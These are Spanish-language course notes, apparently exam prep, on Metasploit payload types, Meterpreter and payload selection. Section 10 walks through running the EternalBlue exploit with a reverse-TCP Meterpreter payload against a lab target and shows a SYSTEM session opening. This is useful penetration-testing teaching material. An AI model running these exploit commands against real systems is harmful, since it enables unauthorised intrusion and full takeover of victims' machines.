
## 1. ¿Qué es un payload?

Un **payload** es un módulo que trabaja junto al exploit para ejecutar código en el sistema objetivo y, normalmente, devolver una shell al atacante.

- **Exploit:** aprovecha la vulnerabilidad del servicio.
    
- **Payload:** ejecuta la acción deseada en el sistema objetivo y puede establecer una conexión con el atacante.
    

Metasploit dispone de tres tipos principales de payloads:

|Tipo|Descripción|
|---|---|
|**Single**|Contiene todo el código necesario para ejecutar la acción en un único payload.|
|**Stager**|Establece el canal de comunicación con el atacante y prepara la recepción de la siguiente etapa.|
|**Stage**|Contiene la funcionalidad que se entrega después de establecer la conexión inicial.|

La `/` en el nombre del payload permite identificar los payloads divididos en etapas (_staged_).

Ejemplos:

```
windows/shell_bind_tcp
```

Payload **Single**, sin etapas.

```
windows/shell/bind_tcp
```

Payload **Staged**, compuesto por un stager (`bind_tcp`) y una etapa (`shell`).

## 2. Singles

Los payloads **Single** contienen todo el código necesario para realizar la acción seleccionada.

Características:

- Son autónomos y se envían como un único objeto.
    
- Ejecutan la acción directamente tras su ejecución.
    
- Suelen ser más estables que los payloads divididos en etapas.
    
- Pueden ser demasiado grandes para determinados exploits.
    

Ejemplos de acciones:

- Añadir un usuario al sistema.
    
- Iniciar un proceso.
    
- Obtener una shell.
    

## 3. Stagers

Los **Stagers** son componentes pequeños que trabajan junto a los payloads Stage.

Su función consiste en:

1. Ejecutarse en la máquina víctima.
    
2. Iniciar una conexión con el listener del atacante.
    
3. Establecer el canal de comunicación.
    
4. Permitir la entrega del payload Stage.
    

Características:

- Están diseñados para ser pequeños y fiables.
    
- Metasploit selecciona automáticamente el stager apropiado para el escenario.
    
- Puede recurrir a otro stager si el preferido no resulta adecuado.
    

### Stagers NX y NO-NX en Windows

- Los stagers NX son más grandes porque utilizan `VirtualAlloc`.
    
- NX y DEP están relacionados con las restricciones de ejecución de memoria.
    
- El stager predeterminado actual es compatible con NX y Windows 7, según el contenido del módulo.
    

## 4. Stages

Los **Stages** son componentes descargados por los stagers que proporcionan la funcionalidad principal del payload.

Permiten utilizar funcionalidades avanzadas sin tener que incluirlas todas en el pequeño código inicial.

Ejemplos:

- Meterpreter.
    
- VNC Injection.
    

Para gestionar payloads grandes, pueden utilizarse stagers intermedios:

1. El stager inicial recibe el stager intermedio.
    
2. El stager intermedio realiza la descarga completa del payload.
    
3. Se entrega el componente necesario para ejecutar la funcionalidad solicitada.
    

Esto también puede resultar útil para gestionar la memoria con permisos de lectura, escritura y ejecución (RWX).

## 5. Payloads por etapas (_Staged Payloads_)

Un payload staged divide la explotación en componentes que realizan funciones diferentes, pero trabajan conjuntamente.

### Funcionamiento

**Stage 0**

- Es el shellcode inicial enviado al servicio vulnerable.
    
- Su objetivo es iniciar la conexión con la máquina del atacante.
    
- Permite establecer el canal de comunicación y recibir una etapa posterior.
    

Nombres habituales relacionados con las conexiones:

```
reverse_tcp
reverse_https
bind_tcp
```

**Stage 1**

- Es el payload posterior, normalmente de mayor tamaño.
    
- Se recibe a través del canal establecido por Stage 0.
    
- Puede proporcionar acceso mediante una shell o Meterpreter.
    

### Reverse Shell

En una conexión inversa (_reverse connection_), la máquina víctima inicia la conexión hacia el atacante.

Ventajas:

- Puede aprovechar las reglas que permiten el tráfico saliente.
    
- Puede evitar las restricciones de entrada más estrictas de determinados firewalls.
    

Sin embargo, el tráfico saliente también puede estar filtrado o supervisado.

## 6. Meterpreter

**Meterpreter** es un payload avanzado de Metasploit que utiliza técnicas de inyección de DLL para ejecutar su funcionalidad en el sistema objetivo.

Características descritas en el módulo:

- Se ejecuta en memoria.
    
- Permite cargar y descargar scripts y plugins dinámicamente.
    
- Proporciona comandos para interactuar con el sistema objetivo.
    
- Ofrece funciones de enumeración, gestión de archivos y procesos, y administración de sesiones.
    

Al ejecutarse, crea una sesión que muestra el prompt:

```
meterpreter >
```

No es una shell estándar de Windows ni de Linux: tiene sus propios comandos.

### Comprobar el usuario actual

En Meterpreter:

```
getuid
```

Ejemplo de resultado:

```
Server username: NT AUTHORITY\SYSTEM
```

El comando `whoami` no funciona directamente en el prompt de Meterpreter porque no es un comando nativo de esa interfaz.

### Consultar la ayuda

```
help
```

## 7. Abrir una shell estándar desde Meterpreter

Para acceder a la línea de comandos real del sistema operativo:

```
meterpreter > shell
```

En el ejemplo del módulo, se crea un canal y aparece el CMD de Windows:

```
Process 2664 created.
Channel 1 created.

Microsoft Windows [Version 6.1.7601]

C:\Users>
```

Ahora se pueden utilizar comandos nativos de Windows:

```
whoami
dir
```

Ejemplo:

```
C:\Users>whoami
nt authority\system
```

**Importante:** los comandos disponibles dependen del prompt en el que estés trabajando.

|Prompt|Interfaz|Ejemplo para consultar el usuario|
|---|---|---|
|`meterpreter >`|Meterpreter|`getuid`|
|`C:\Users>`|CMD de Windows|`whoami`|

Abrir una shell estándar no cambia por sí mismo el nivel de privilegios de la sesión.

## 8. Buscar payloads

Para mostrar los payloads disponibles:

```
show payloads
```

La lista incluye payloads para diferentes sistemas operativos, arquitecturas y tipos de conexión.

### Filtrar payloads con grep

Para buscar payloads que contengan `meterpreter`:

```
grep meterpreter show payloads
```

Para contar los resultados:

```
grep -c meterpreter show payloads
```

Para buscar payloads de Meterpreter que utilicen conexiones TCP inversas:

```
grep meterpreter grep reverse_tcp show payloads
```

Para contar los resultados filtrados:

```
grep -c meterpreter grep reverse_tcp show payloads
```

En el ejemplo del módulo, el filtrado reduce los resultados a tres opciones:

```
windows/x64/meterpreter/reverse_tcp
windows/x64/meterpreter/reverse_tcp_rc4
windows/x64/meterpreter/reverse_tcp_uuid
```

**Consejo:** utiliza `grep` para reducir las listas extensas de payloads y localizar rápidamente el que necesitas.

## 9. Seleccionar un payload

Primero debemos seleccionar un módulo de exploit. Después, podemos elegir el payload con:

```
set payload <número>
```

Ejemplo del módulo:

```
set payload 15
```

Resultado:

```
payload => windows/x64/meterpreter/reverse_tcp
```

También es posible seleccionar un payload utilizando su ruta, cuando corresponda:

```
set payload windows/x64/meterpreter/reverse_tcp
```

Después de seleccionarlo, las opciones del payload aparecen al ejecutar:

```
show options
```

### Opciones importantes

|Parámetro|Descripción|
|---|---|
|`RHOSTS`|Dirección IP del objetivo remoto.|
|`RPORT`|Puerto del servicio objetivo.|
|`LHOST`|Dirección IP local del atacante donde se espera la conexión inversa.|
|`LPORT`|Puerto local en el que escucha el handler.|

Los parámetros disponibles dependen del exploit y del payload seleccionados.

## 10. Configurar y ejecutar un exploit con Meterpreter

Ejemplo del módulo con el exploit EternalBlue en un laboratorio autorizado:

```
use exploit/windows/smb/ms17_010_eternalblue
```

Consultar las opciones:

```
show options
```

Filtrar los payloads disponibles:

```
grep meterpreter grep reverse_tcp show payloads
```

Seleccionar el payload:

```
set payload windows/x64/meterpreter/reverse_tcp
```

Consultar la IP local:

```
ifconfig
```

Configurar la IP del atacante y la del objetivo:

```
set LHOST 10.10.14.15
set RHOSTS 10.10.10.40
```

Revisar la configuración:

```
show options
```

Ejecutar el módulo:

```
run
```

En el ejemplo del curso, Metasploit detecta que el objetivo probablemente es vulnerable a MS17-010, ejecuta el exploit y abre una sesión de Meterpreter.

Un resultado representativo es:

```
[*] Started reverse TCP handler on 10.10.14.15:4444
[*] Sending stage (201283 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened
```

A continuación, se puede comprobar el usuario:

```
meterpreter > getuid
```

**Nota:** las direcciones IP del ejemplo pertenecen al escenario del módulo. En otro laboratorio deben utilizarse las direcciones correspondientes.

## 11. Tipos de payload habituales en Windows

|Payload|Descripción|
|---|---|
|`generic/custom`|Listener genérico y multiuso.|
|`generic/shell_bind_tcp`|Shell estándar con conexión TCP de tipo bind.|
|`generic/shell_reverse_tcp`|Shell estándar con conexión TCP inversa.|
|`windows/x64/exec`|Ejecuta un comando arbitrario en Windows x64.|
|`windows/x64/loadlibrary`|Carga una biblioteca x64 desde una ruta indicada.|
|`windows/x64/messagebox`|Muestra un cuadro de diálogo personalizable.|
|`windows/x64/shell_reverse_tcp`|Shell estándar, payload Single y conexión TCP inversa.|
|`windows/x64/shell/reverse_tcp`|Shell estándar mediante Stager y Stage con conexión TCP inversa.|
|`windows/x64/shell/bind_ipv6_tcp`|Shell estándar mediante Stager y Stage con conexión TCP bind IPv6.|
|`windows/x64/meterpreter/$`|Variantes de Meterpreter para Windows x64.|
|`windows/x64/powershell/$`|Variantes de sesiones interactivas de PowerShell.|
|`windows/x64/vncinject/$`|Variantes de servidor VNC mediante inyección reflectiva.|

El símbolo `$` representa otras variantes del payload, no parte literal de su nombre.

También existen payloads de otras plataformas y herramientas, como Empire y Cobalt Strike, que quedan fuera del alcance de esta sección.

## 12. Puntos clave para el examen

- **Single:** payload autónomo que contiene todo el código necesario.
    
- **Stager:** establece el canal de comunicación y permite recibir la siguiente etapa.
    
- **Stage:** contiene la funcionalidad posterior, que puede ser más grande.
    
- **Staged:** divide el payload en varios componentes.
    
- **Reverse shell:** la víctima inicia la conexión hacia el atacante.
    
- `**show payloads**`**:** muestra los payloads disponibles.
    
- `**grep**`**:** filtra los resultados de los comandos de Metasploit.
    
- `**set payload <número>**`**:** selecciona un payload para el exploit activo.
    
- `**show options**`**:** permite revisar las opciones del exploit y del payload.
    
- `**RHOSTS**`**:** dirección del objetivo.
    
- `**LHOST**`**:** dirección local del atacante.
    
- `**RPORT**`**:** puerto del servicio objetivo.
    
- `**LPORT**`**:** puerto de escucha del atacante.
    
- `**getuid**`**:** consulta el usuario en Meterpreter.
    
- `**shell**`**:** abre una shell estándar del sistema operativo desde Meterpreter.
    
- `**whoami**` **no es un comando de Meterpreter:** debe ejecutarse desde una shell del sistema operativo.
    
- `**msfvenom**`**:** permite generar payloads personalizados; se estudiará posteriormente en el módulo.
